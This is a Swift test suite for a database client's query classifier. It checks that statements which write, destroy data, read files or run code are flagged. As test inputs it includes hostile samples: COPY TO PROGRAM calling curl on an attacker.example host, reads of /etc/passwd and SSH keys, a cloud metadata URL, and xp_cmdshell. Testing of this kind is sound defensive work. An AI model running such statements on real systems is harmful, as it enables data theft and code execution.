//
//  QueryClassifierHardeningTests.swift
//  TableProTests
//

import Foundation
@testable import TablePro
import Testing

struct QueryClassifierFailClosedTests {
    @Test("Statements the keyword table does not know are treated as writes")
    func unknownKeywordIsWrite() {
        let unknown = [
            "SOMETHING_NEW users",
            "FROBNICATE TABLE users",
            "ZZZ",
            "GRAPH TRAVERSE users",
            "PLUGIN_DO_THING()"
        ]
        for statement in unknown {
            #expect(
                QueryClassifier.classifyTier(statement, databaseType: .postgresql) == .write,
                "\(statement) must fail closed as a write"
            )
        }
        #expect(QueryClassifier.classifyTier("BATCH APPLY", databaseType: .cassandra) == .write)
    }

    @Test("DO runs arbitrary server-side code, so it is a write that reaches code execution")
    func doBlockIsNeverSafe() {
        let block = "DO $$ BEGIN DELETE FROM users; END $$"
        #expect(QueryClassifier.classifyTier(block, databaseType: .postgresql) == .write)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(block, databaseType: .postgresql))
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(
            "do $$ begin perform 1; end $$",
            databaseType: .postgresql
        ))
    }

    @Test("COPY reaches the filesystem in both directions and TO PROGRAM executes code")
    func copyIsNeverSafe() {
        let statements = [
            "COPY users TO PROGRAM 'curl attacker.example'",
            "COPY users FROM PROGRAM 'cat /etc/passwd'",
            "COPY users FROM '/etc/passwd'",
            "COPY users TO '/tmp/leak.csv'",
            "COPY users FROM STDIN"
        ]
        for statement in statements {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql),
                "\(statement) must be flagged as reaching the filesystem or running code"
            )
            #expect(QueryClassifier.isWriteQuery(statement, databaseType: .postgresql))
        }
    }

    @Test("Each keyword the old allowlist missed now classifies as a write")
    func keywordsTheAllowlistMissed() {
        let writes: [String: String] = [
            "DO": "DO $$ BEGIN PERFORM 1; END $$",
            "COPY": "COPY users FROM '/tmp/in.csv'",
            "ATTACH": "ATTACH DATABASE '/tmp/evil.db' AS evil",
            "VACUUM": "VACUUM FULL users",
            "SET": "SET search_path TO public",
            "LOCK": "LOCK TABLE users IN EXCLUSIVE MODE",
            "COMMENT": "COMMENT ON TABLE users IS 'x'",
            "REFRESH": "REFRESH MATERIALIZED VIEW report",
            "REINDEX": "REINDEX TABLE users",
            "CLUSTER": "CLUSTER users USING users_pkey",
            "PREPARE": "PREPARE plan AS SELECT 1",
            "INSTALL": "INSTALL httpfs"
        ]
        for (keyword, statement) in writes {
            #expect(
                QueryClassifier.isWriteQuery(statement, databaseType: .postgresql),
                "\(keyword) must classify as a write"
            )
        }
    }

    @Test("Transaction control is a write, not a read")
    func transactionControlIsAWrite() {
        for statement in ["BEGIN", "START TRANSACTION", "COMMIT", "ROLLBACK", "SAVEPOINT a", "RELEASE a"] {
            #expect(
                QueryClassifier.isWriteQuery(statement, databaseType: .postgresql),
                "\(statement) must classify as a write"
            )
        }
    }

    @Test("Filesystem and code-execution markers are flagged wherever they appear")
    func filesystemAndCodeExecutionMarkers() {
        let flagged = [
            "SELECT * FROM users INTO OUTFILE '/tmp/out'",
            "SELECT * FROM users INTO DUMPFILE '/tmp/out'",
            "VACUUM INTO '/tmp/copy.db'",
            "SELECT load_file('/etc/passwd')",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT pg_ls_dir('/')",
            "SELECT lo_export(1, '/tmp/x')",
            "SELECT readfile('/etc/passwd')",
            "SELECT load_extension('/tmp/evil.dylib')",
            "EXEC xp_cmdshell 'dir'",
            "DECLARE @o INT; EXEC sp_OACreate 'x', @o OUT"
        ]
        for statement in flagged {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql),
                "\(statement) must be flagged"
            )
            #expect(QueryClassifier.isWriteQuery(statement, databaseType: .postgresql))
        }
    }

    @Test("A SELECT that reads a file, a directory, a URL or another database through a function is flagged", arguments: [
        (DatabaseType.duckdb, "SELECT content FROM read_text('/Users/ann/.ssh/id_ed25519')"),
        (DatabaseType.duckdb, "SELECT file FROM glob('/Users/ann/.ssh/*')"),
        (DatabaseType.duckdb, "SELECT * FROM read_csv('https://attacker.example/collect.csv')"),
        (DatabaseType.duckdb, "SELECT * FROM READ_PARQUET (['a.parquet', 'b.parquet'])"),
        (DatabaseType.duckdb, "SELECT * FROM system.main.read_blob/* c */('/etc/passwd')"),
        (DatabaseType.duckdb, "WITH f AS (SELECT * FROM \"read_blob\" ('/etc/passwd')) SELECT * FROM f"),
        (DatabaseType.duckdb, "SELECT * FROM read_text\u{00A0}('/etc/passwd')"),
        (DatabaseType.duckdb, "SELECT * FROM parquet_scan('a.parquet')"),
        (DatabaseType.duckdb, "SELECT * FROM parquet_metadata('a.parquet')"),
        (DatabaseType.duckdb, "SELECT * FROM sniff_csv('/etc/passwd')"),
        (DatabaseType.duckdb, "SELECT * FROM ST_Read('a.shp')"),
        (DatabaseType.duckdb, "SELECT * FROM sqlite_scan('/Users/ann/Library/other.db', 'notes')"),
        (DatabaseType.duckdb, "SELECT * FROM postgres_query('host=10.0.0.1', 'SELECT 1')"),
        (DatabaseType.duckdb, "SELECT * FROM iceberg_scan('s3://bucket/table')"),
        (DatabaseType.duckdb, "SELECT * FROM query('SELECT * FROM read_' || 'text(''/etc/passwd'')')"),
        (DatabaseType.duckdb, "SELECT * FROM query_table('/Users/ann/Documents/payroll.csv')"),
        (DatabaseType.duckdb, "EXPLAIN SELECT * FROM read_csv('/etc/passwd')"),
        (DatabaseType.clickhouse, "SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'RawBLOB')"),
        (DatabaseType.clickhouse, "SELECT * FROM file('secrets.tsv', 'LineAsString')"),
        (DatabaseType.clickhouse, "SELECT * FROM `remoteSecure`('10.0.0.1', system.users)"),
        (DatabaseType.clickhouse, "SELECT * FROM executable('x.sh', TabSeparated, 'a String')"),
        (DatabaseType.clickhouse, "SELECT * FROM icebergLocal('/var/lib/table')")
    ])
    func functionsReachingOutsideAreFlagged(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: engine))
    }

    @Test("DuckDB reads a file named where a table is", arguments: [
        "SELECT * FROM '/Users/ann/Documents/payroll.csv'",
        "SELECT * FROM \"/Users/ann/Documents/payroll.csv\"",
        "SELECT * FROM notes, /* c */ '/Users/ann/Documents/payroll.csv'",
        "SELECT * FROM notes JOIN 'payroll.parquet' USING (id)",
        "FROM 'payroll.csv'",
        "DESCRIBE '/Users/ann/Documents/payroll.csv'",
        "SUMMARIZE '/Users/ann/Documents/payroll.csv'"
    ])
    func fileNamedAsTableIsFlagged(sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: .duckdb))
        #expect(!QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: .postgresql))
    }

    @Test("A read that reaches outside the database is still a read", arguments: [
        (DatabaseType.duckdb, "SELECT * FROM 'payroll.csv'"),
        (DatabaseType.duckdb, "SELECT * FROM read_parquet('payroll.parquet')"),
        (DatabaseType.clickhouse, "SELECT * FROM s3('https://bucket.s3.amazonaws.com/a.csv')")
    ])
    func readsOutsideTheDatabaseKeepTheirTier(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .safe)
    }

    @Test("A string that is a value, and a name that is a function elsewhere, stay plain reads", arguments: [
        (DatabaseType.duckdb, "SELECT 'a.csv', 'b.csv' FROM notes WHERE path = 'c.csv' ORDER BY 'd'"),
        (DatabaseType.duckdb, "SELECT * FROM \"main\".\"notes\" JOIN tags ON tags.name = 'x' AND tags.kind IN ('a', 'b')"),
        (DatabaseType.duckdb, "SELECT * FROM range(1, 10), notes WHERE body LIKE 'from %'"),
        (DatabaseType.duckdb, "SELECT extract(year FROM '2026-01-01'::DATE), trim('x' FROM 'xax') FROM notes"),
        (DatabaseType.duckdb, "SELECT read_at, glob, query FROM notes WHERE name GLOB 'a*'"),
        (DatabaseType.duckdb, "SELECT * FROM duckdb_tables()"),
        (DatabaseType.clickhouse, "SELECT file, url, URLHash(url), filesystemAvailable() FROM downloads"),
        (DatabaseType.sqlite, "SELECT * FROM notes WHERE glob('a*', name)"),
        (DatabaseType.postgresql, "SELECT file, url, query(1) FROM downloads")
    ])
    func ordinaryReadsStaySafe(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classify(sql, databaseType: engine) == .safe)
    }

    @Test("VACUUM INTO reaches the filesystem whether or not it names a schema")
    func vacuumIntoIsFlaggedWithASchemaName() {
        let flagged = [
            "VACUUM INTO '/tmp/copy.db'",
            "VACUUM main INTO '/tmp/copy.db'",
            "vacuum main into '/tmp/copy.db'",
            "VACUUM main /* copy */ INTO '/tmp/copy.db'",
            "VACUUM \"main\" INTO '/tmp/copy.db'"
        ]
        for statement in flagged {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .sqlite),
                "\(statement) must be flagged"
            )
            #expect(QueryClassifier.isWriteQuery(statement, databaseType: .sqlite))
        }
        for statement in ["VACUUM", "VACUUM main", "VACUUM (ANALYZE) orders"] {
            #expect(QueryClassifier.classifyTier(statement, databaseType: .postgresql) == .write)
            #expect(
                !QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql),
                "\(statement) writes no file"
            )
        }
    }

    @Test("LOAD DATA INFILE reaches the filesystem")
    func loadDataInfileIsFlagged() {
        let statement = "LOAD DATA INFILE '/etc/passwd' INTO TABLE staging"
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .mysql))
        #expect(QueryClassifier.isWriteQuery(statement, databaseType: .mysql))
    }

    @Test("T-SQL's BULK loads a file the server can reach", arguments: [
        "BULK INSERT dbo.staging FROM '\\\\198.51.100.7\\share\\rows.txt'",
        "SELECT 1 BULK INSERT dbo.staging FROM 'C:\\rows.txt'",
        "SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_CLOB) AS f",
        "INSERT INTO dbo.staging SELECT BulkColumn FROM OPENROWSET ( BULK 'C:\\web.config', SINGLE_BLOB) AS f",
    ])
    func bulkLoadsAreFlagged(statement: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .mssql))
        #expect(QueryClassifier.isWriteQuery(statement, databaseType: .mssql))
    }

    @Test("T-SQL's ad hoc data sources open the file or the server the statement names", arguments: [
        "SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Text;Database=C:\\logs', 'SELECT * FROM app.txt')",
        "SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0', 'Data Source=C:\\a.xlsx')...[Sheet1$]",
    ])
    func adHocDataSourcesAreFlagged(statement: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .mssql))
    }

    @Test("A word that only resembles T-SQL's BULK reaches no file", arguments: [
        "GRANT ADMINISTER BULK OPERATIONS TO loader",
        "ALTER DATABASE app SET RECOVERY BULK_LOGGED",
        "SELECT [bulk], bulk_id, 'BULK INSERT' FROM dbo.orders",
        "SELECT [openrowset] FROM dbo.orders",
    ])
    func bulkLookalikesAreNotFlagged(statement: String) {
        #expect(!QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .mssql))
    }

    @Test("Ordinary reads stay safe and never claim to reach the filesystem")
    func readsStaySafe() {
        let reads = [
            "SELECT * FROM users",
            "WITH t AS (SELECT 1) SELECT * FROM t",
            "SHOW TABLES",
            "DESCRIBE users",
            "DESC users",
            "EXPLAIN SELECT * FROM users",
            "EXPLAIN ANALYZE SELECT * FROM users",
            "TABLE users",
            "VALUES (1)",
            "SELECT * FROM dropped_items",
            "SELECT * FROM insert_log"
        ]
        for statement in reads {
            #expect(
                !QueryClassifier.isWriteQuery(statement, databaseType: .postgresql),
                "\(statement) must stay safe"
            )
            #expect(!QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql))
        }
    }

    @Test("An empty or comment-only statement is safe because it runs nothing")
    func emptyStatementIsSafe() {
        #expect(QueryClassifier.classifyTier("", databaseType: .postgresql) == .safe)
        #expect(QueryClassifier.classifyTier("   \n\t ", databaseType: .postgresql) == .safe)
        #expect(QueryClassifier.classifyTier("-- just a note", databaseType: .postgresql) == .safe)
    }

    @Test("A leading comment never hides the real keyword")
    func leadingCommentsDoNotHideTheKeyword() {
        #expect(
            QueryClassifier.classifyTier("-- harmless\nDROP TABLE users", databaseType: .postgresql)
                == .destructive
        )
        #expect(
            QueryClassifier.classifyTier("/* SELECT */ DROP TABLE users", databaseType: .postgresql)
                == .destructive
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "/* fine */ DO $$ BEGIN PERFORM 1; END $$",
                databaseType: .postgresql
            )
        )
    }

    @Test("A leading block comment ends where the engine ends it, so a -- inside it hides nothing")
    func leadingBlockCommentEndsWhereTheEngineEndsIt() {
        for type in [DatabaseType.sqlite, .mysql, .postgresql, .mssql, .oracle] {
            #expect(QueryClassifier.classifyTier("/*/ -- */ DROP TABLE users", databaseType: type) == .destructive)
        }
        for type in [DatabaseType.postgresql, .mssql, .duckdb] {
            #expect(QueryClassifier.classifyTier("/* /* */ -- */ DROP TABLE users", databaseType: type) == .destructive)
        }
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "/*/ -- */ COPY users TO PROGRAM 'id'",
                databaseType: .postgresql
            )
        )
        #expect(QueryClassifier.classifyTier("/*/ -- */ SELECT 1", databaseType: .postgresql) == .safe)
        #expect(QueryClassifier.classifyTier("/*/ -- */", databaseType: .postgresql) == .safe)
    }

    @Test("EXPLAIN ANALYZE of a write executes the write")
    func explainAnalyzeInheritsInnerTier() {
        #expect(QueryClassifier.isWriteQuery("EXPLAIN ANALYZE DELETE FROM users", databaseType: .postgresql))
        #expect(
            QueryClassifier.classifyTier(
                "EXPLAIN (ANALYZE, BUFFERS) DROP TABLE users",
                databaseType: .postgresql
            ) == .destructive
        )
        #expect(!QueryClassifier.isWriteQuery("EXPLAIN DELETE FROM users", databaseType: .postgresql))
    }

    @Test("DROP and TRUNCATE are destructive, and ALTER is destructive only when it drops")
    func destructiveTiers() {
        #expect(QueryClassifier.classifyTier("DROP TABLE users", databaseType: .postgresql) == .destructive)
        #expect(QueryClassifier.classifyTier("TRUNCATE users", databaseType: .postgresql) == .destructive)
        #expect(
            QueryClassifier.classifyTier("ALTER TABLE users DROP COLUMN email", databaseType: .postgresql)
                == .destructive
        )
        #expect(
            QueryClassifier.classifyTier("ALTER TABLE users ADD COLUMN email TEXT", databaseType: .postgresql)
                == .write
        )
    }

    @Test("A DELETE without WHERE is dangerous, with WHERE it is an ordinary write")
    func unqualifiedDeleteIsDangerous() {
        #expect(QueryClassifier.isDangerousQuery("DELETE FROM users", databaseType: .postgresql))
        #expect(!QueryClassifier.isDangerousQuery("DELETE FROM users WHERE id = 1", databaseType: .postgresql))
        #expect(QueryClassifier.isWriteQuery("DELETE FROM users WHERE id = 1", databaseType: .postgresql))
    }

    @Test("SELECT INTO writes a table even though it starts with SELECT")
    func selectIntoIsAWrite() {
        #expect(
            QueryClassifier.classifyTier("SELECT * INTO backup FROM users", databaseType: .postgresql)
                == .write
        )
    }

    @Test("A common table expression inherits the tier of the statement it hides")
    func commonTableExpressionsInheritTheirTier() {
        #expect(
            QueryClassifier.classifyTier(
                "WITH removed AS (DELETE FROM users RETURNING id) SELECT * FROM removed",
                databaseType: .postgresql
            ) == .write
        )
        #expect(
            QueryClassifier.classifyTier(
                "WITH x AS (SELECT 1) DROP TABLE users",
                databaseType: .postgresql
            ) == .destructive
        )
    }

    @Test("A string literal never triggers a keyword match")
    func literalsAreStripped() {
        #expect(!QueryClassifier.isWriteQuery("SELECT 'drop table users' AS note", databaseType: .postgresql))
        #expect(
            !QueryClassifier.isDangerousQuery(
                "WITH t AS (SELECT 'delete me') SELECT * FROM t",
                databaseType: .postgresql
            )
        )
        #expect(
            !QueryClassifier.isWriteQuery(
                "SELECT * FROM notes WHERE body = 'copy users to program'",
                databaseType: .postgresql
            )
        )
    }

    @Test("Two statements in one string are reported as multi-statement")
    func multiStatementIsDetected() {
        #expect(QueryClassifier.isMultiStatement("SELECT 1; SELECT 2", databaseType: .postgresql))
        #expect(!QueryClassifier.isMultiStatement("SELECT 1", databaseType: .postgresql))
        #expect(!QueryClassifier.isMultiStatement("SELECT 1;", databaseType: .postgresql))
    }
}

struct QueryClassifierCommentBoundaryTests {
    @Test(
        "A line comment ends at a carriage return as well as a line feed",
        arguments: ["-- note\r\nDROP TABLE users", "-- note\rDROP TABLE users", "/* a */ -- b\r\nDROP TABLE users"]
    )
    func lineCommentEndsAtAnyLineBreak(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .postgresql) == .destructive)
    }

    @Test("A DELETE after a CRLF comment is still an unqualified delete")
    func deleteAfterCRLFCommentIsDangerous() {
        #expect(QueryClassifier.isDangerousQuery("-- note\r\nDELETE FROM users", databaseType: .mysql))
    }

    @Test("A CRLF comment inside a statement does not hide what follows it")
    func crlfCommentDoesNotSwallowTheBody() {
        #expect(
            QueryClassifier.classifyTier(
                "WITH x AS (SELECT 1) -- note\r\nDELETE FROM users",
                databaseType: .postgresql
            ) == .write
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "SELECT * FROM users -- note\r\nINTO OUTFILE '/tmp/users.csv'",
                databaseType: .mysql
            )
        )
    }

    @Test("A CRLF comment between EXPLAIN and ANALYZE does not hide the write it runs")
    func explainAnalyzeAfterCRLFComment() {
        #expect(
            QueryClassifier.isWriteQuery("EXPLAIN -- options\r\nANALYZE DELETE FROM users", databaseType: .postgresql)
        )
    }

    @Test(
        "A conditional comment that drops data is destructive",
        arguments: [
            "/*!50000 DROP TABLE users */",
            "/*M!100000 DROP TABLE users */",
            "/*!99999 SELECT 1 */ /*!1 TRUNCATE users */",
        ]
    )
    func conditionalCommentDropIsDestructive(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .mysql) == .destructive)
    }

    @Test(
        "A conditional comment may or may not run, so a statement carrying one is never safe",
        arguments: [
            "/*!99999 SELECT 1 */ /*!1 DELETE FROM users */",
            "/*!99999 SELECT 1 */ DELETE FROM users",
            "SELECT /*!40001 SQL_NO_CACHE */ * FROM users",
        ]
    )
    func conditionalCommentIsNeverSafe(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .mysql) == .write)
    }

    @Test(
        "A file or code surface inside a conditional comment is flagged",
        arguments: [
            "SELECT * FROM users /*!50000 INTO OUTFILE '/tmp/users.csv' */",
            "/*!40000 LOAD DATA INFILE '/etc/passwd' INTO TABLE t */",
        ]
    )
    func conditionalCommentFilesystemIsFlagged(sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: .mysql))
        #expect(QueryClassifier.isWriteQuery(sql, databaseType: .mysql))
    }

    @Test("A WHERE inside a conditional comment does not qualify the DELETE")
    func conditionalWhereDoesNotQualifyDelete() {
        #expect(
            QueryClassifier.isDangerousQuery("DELETE FROM users /*!99999 WHERE id = 1 */", databaseType: .mysql)
        )
    }

    @Test(
        "The conditional comment opener only counts where a comment could start",
        arguments: ["SELECT '/*! DROP TABLE users */' AS note", "/* see /*! */ SELECT 1", "-- /*! DROP\nSELECT 1"]
    )
    func conditionalOpenerInsideLiteralOrCommentIsInert(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .mysql) == .safe)
    }
}

struct QueryClassifierNonSqlTests {
    @Test("MongoDB read methods stay safe and writes never look like reads")
    func mongoTiers() {
        #expect(!QueryClassifier.isWriteQuery("db.users.find({a: 1})", databaseType: .mongodb))
        #expect(!QueryClassifier.isWriteQuery("db.users.aggregate([{$match: {a: 1}}])", databaseType: .mongodb))
        #expect(QueryClassifier.isWriteQuery("db.users.insertOne({a: 1})", databaseType: .mongodb))
        #expect(QueryClassifier.isWriteQuery("db.users.updateMany({}, {$set: {a: 1}})", databaseType: .mongodb))
        #expect(QueryClassifier.classifyTier("db.users.deleteMany({})", databaseType: .mongodb) == .destructive)
        #expect(QueryClassifier.classifyTier("db.users.drop()", databaseType: .mongodb) == .destructive)
    }

    @Test("MongoDB server-side JavaScript is flagged even inside a find")
    func mongoCodeExecutionIsFlagged() {
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "db.users.find({$where: 'this.a == 1'})",
                databaseType: .mongodb
            )
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "db.users.aggregate([{$function: {body: 'function(){}'}}])",
                databaseType: .mongodb
            )
        )
    }

    @Test("A MongoDB pipeline that writes through $out or $merge is a write")
    func mongoPipelineWritesAreWrites() {
        #expect(
            QueryClassifier.isWriteQuery("db.users.aggregate([{$out: 'copy'}])", databaseType: .mongodb)
        )
        #expect(
            QueryClassifier.isWriteQuery("db.users.aggregate([{$merge: 'copy'}])", databaseType: .mongodb)
        )
    }

    @Test("An unparsable MongoDB statement fails closed as a write")
    func mongoUnknownFailsClosed() {
        #expect(QueryClassifier.isWriteQuery("runCommand", databaseType: .mongodb))
    }

    /// XAUTOCLAIM moves pending entries to another consumer and drops deleted ones from the PEL.
    @Test("Redis XAUTOCLAIM is a write")
    func redisAutoclaimIsWrite() {
        #expect(QueryClassifier.isWriteQuery("XAUTOCLAIM orders workers mallory 0 0-0 COUNT 10", databaseType: .redis))
    }

    @Test("Redis reads come from an allowlist and everything else is a write")
    func redisAllowlist() {
        for command in ["GET key", "HGETALL hash", "LRANGE list 0 -1", "SCAN 0", "TTL key"] {
            #expect(
                !QueryClassifier.isWriteQuery(command, databaseType: .redis),
                "\(command) must stay safe"
            )
        }
        for command in ["SET key value", "DEL key", "HSET hash field value", "SOME.UNKNOWN.COMMAND"] {
            #expect(
                QueryClassifier.isWriteQuery(command, databaseType: .redis),
                "\(command) must classify as a write"
            )
        }
    }

    @Test("Redis scripting and persistence commands are flagged as code or filesystem")
    func redisUnsafeSurfaces() {
        for command in ["EVAL \"return 1\" 0", "EVALSHA abc 0", "FUNCTION LOAD x", "SCRIPT LOAD x", "SAVE"] {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(command, databaseType: .redis),
                "\(command) must be flagged"
            )
        }
        #expect(QueryClassifier.classifyTier("FLUSHALL", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("DEBUG SEGFAULT", databaseType: .redis) == .destructive)
    }

    @Test("Every Redis command in a text is tiered, a line break ending one as a semicolon does")
    func redisEveryCommandIsTiered() {
        #expect(QueryClassifier.classifyTier("GET a\nFLUSHALL", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("GET a; DEL b", databaseType: .redis) == .write)
        #expect(QueryClassifier.classifyTier("GET a\nGET b;", databaseType: .redis) == .safe)
        #expect(QueryClassifier.classifyTier("GET \"a\nFLUSHALL\"", databaseType: .redis) == .safe)
        #expect(QueryClassifier.isMultiStatement("GET a\nGET b", databaseType: .redis))
        #expect(!QueryClassifier.isMultiStatement("SET k \"a\nb\"", databaseType: .redis))
    }

    @Test("A Redis line that looks like a SQL comment is a command, so it never hides the next one")
    func redisCommentLookalikesHideNothing() {
        #expect(QueryClassifier.classifyTier("/*\nFLUSHALL\n*/ GET a", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("-- note\nGET a", databaseType: .redis) == .write)
    }

    @Test("Redis CONFIG splits on the subcommand")
    func redisConfigSplitsOnSubcommand() {
        #expect(QueryClassifier.classifyTier("CONFIG GET maxmemory", databaseType: .redis) == .safe)
        #expect(QueryClassifier.classifyTier("CONFIG SET maxmemory 100", databaseType: .redis) == .destructive)
    }

    /// Read as the bare word `DB`, `DB 0 FLUSHDB` passed as an ordinary write and skipped the
    /// confirmation a destructive statement asks for.
    @Test("A Redis DB prefix is classified by the command it wraps")
    func redisDatabasePrefix() {
        #expect(QueryClassifier.classifyTier("DB 0 FLUSHDB", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("db db2 CONFIG SET maxmemory 1", databaseType: .redis) == .destructive)
        #expect(!QueryClassifier.isWriteQuery("DB 3 GET key", databaseType: .redis))
        #expect(QueryClassifier.isWriteQuery("DB 3 SET key value", databaseType: .redis))
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("DB 1 EVAL \"return 1\" 0", databaseType: .redis))
        #expect(QueryClassifier.isWriteQuery("DB 3", databaseType: .redis))
    }

    /// `OUTSIDEBLOCK` is the Server Dashboard's prefix for a command held out of the user's MULTI
    /// block. Read as the bare word, `OUTSIDEBLOCK FLUSHALL` passed as an ordinary write.
    @Test("Redis OUTSIDEBLOCK prefix is classified by the command it wraps")
    func redisOutsideBlockPrefix() {
        #expect(QueryClassifier.classifyTier("OUTSIDEBLOCK FLUSHALL", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("outsideblock DB 0 FLUSHDB", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("DB 0 OUTSIDEBLOCK FLUSHDB", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("OUTSIDEBLOCK EVAL \"return 1\" 0", databaseType: .redis))
        #expect(!QueryClassifier.isWriteQuery("OUTSIDEBLOCK GET key", databaseType: .redis))
        #expect(QueryClassifier.isWriteQuery("OUTSIDEBLOCK", databaseType: .redis))
    }

    /// The driver strips redis-cli quoting before it sends, so a quoted command runs as the bare
    /// one. Read as written, `"FLUSHALL"` matched no set and passed as an ordinary write.
    @Test("A quoted Redis command is classified as the command the driver runs")
    func redisQuotedCommand() {
        #expect(QueryClassifier.classifyTier("\"FLUSHALL\"", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("'FLUSHDB' ASYNC", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("DB 0 \"FLUSHALL\"", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("'DB' 0 FLUSHALL", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("\"\\x46LUSHALL\"", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("CONFIG \"SET\" maxmemory 1", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("\"GET\" key", databaseType: .redis) == .safe)
    }

    @Test("etcd verbs separate reads, writes, deletes and snapshots")
    func etcdTiers() {
        #expect(!QueryClassifier.isWriteQuery("get /keys", databaseType: .etcd))
        #expect(!QueryClassifier.isWriteQuery("watch /keys", databaseType: .etcd))
        #expect(QueryClassifier.isWriteQuery("put /keys value", databaseType: .etcd))
        #expect(QueryClassifier.classifyTier("del /keys", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.classifyTier("compact 5", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("snapshot save backup.db", databaseType: .etcd))
    }

    @Test("etcd subcommands that delete keys, users or roles, or turn authentication off, are destructive")
    func etcdDestructiveSubcommands() {
        let destructive = [
            "lease revoke 7b",
            "LEASE REVOKE 0x7b",
            "\"lease\" 'revoke' 7b",
            "user delete alice",
            "role delete readers",
            "auth disable",
            "\"del\" /keys --prefix",
            "delete /keys",
            "compaction 5 --physical"
        ]
        for statement in destructive {
            #expect(
                QueryClassifier.classifyTier(statement, databaseType: .etcd) == .destructive,
                "\(statement) must be destructive"
            )
        }
    }

    @Test("etcd list, status and lookup subcommands are reads")
    func etcdReadSubcommands() {
        let reads = [
            "member list",
            "lease list",
            "lease timetolive 7b --keys",
            "endpoint status",
            "endpoint health",
            "user list",
            "role list",
            "'get' /keys --prefix"
        ]
        for statement in reads {
            #expect(
                QueryClassifier.classifyTier(statement, databaseType: .etcd) == .safe,
                "\(statement) must be safe"
            )
        }
    }

    @Test("etcd grants, keep-alives and account additions are plain writes")
    func etcdWriteSubcommands() {
        let writes = [
            "lease grant 60",
            "lease keep-alive 7b",
            "auth enable",
            "user add alice secret",
            "role add readers",
            "user grant-role alice readers",
            "user revoke-role alice readers",
            "put /keys value --lease 7b"
        ]
        for statement in writes {
            #expect(
                QueryClassifier.classifyTier(statement, databaseType: .etcd) == .write,
                "\(statement) must be a write"
            )
        }
    }

    @Test("etcd text the parser rejects is tiered by the worst its command can do")
    func etcdUnparsedFailsClosed() {
        #expect(QueryClassifier.classifyTier("del --from-key /a", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.classifyTier("lease revoke", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.classifyTier("member remove 8e9e05c52164694d", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.classifyTier("put /keys", databaseType: .etcd) == .write)
        #expect(QueryClassifier.classifyTier("get", databaseType: .etcd) == .write)
        #expect(QueryClassifier.classifyTier("move-leader 8e9e05c52164694d", databaseType: .etcd) == .write)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("defrag", databaseType: .etcd))
    }

    @Test("Elasticsearch separates read verbs from writes and deletes")
    func elasticsearchTiers() {
        #expect(!QueryClassifier.isWriteQuery("GET /index/_search", databaseType: .elasticsearch))
        #expect(!QueryClassifier.isWriteQuery("POST /index/_search\n{}", databaseType: .elasticsearch))
        #expect(QueryClassifier.isWriteQuery("PUT /index/_doc/1", databaseType: .elasticsearch))
        #expect(QueryClassifier.isWriteQuery("POST /index/_doc", databaseType: .elasticsearch))
        #expect(QueryClassifier.classifyTier("DELETE /index", databaseType: .elasticsearch) == .destructive)
    }

    @Test(
        "An Elasticsearch request reads only when the request the driver sends reads",
        arguments: [
            "GET /orders/_search\n{\"query\": {\"match_all\": {}}}",
            "POST /orders/_search/template\n{}",
            "POST /_sql?format=txt\n{\"query\": \"SELECT 1\"}",
            "POST /orders,archive/_count",
            "GET /_cat/indices"
        ]
    )
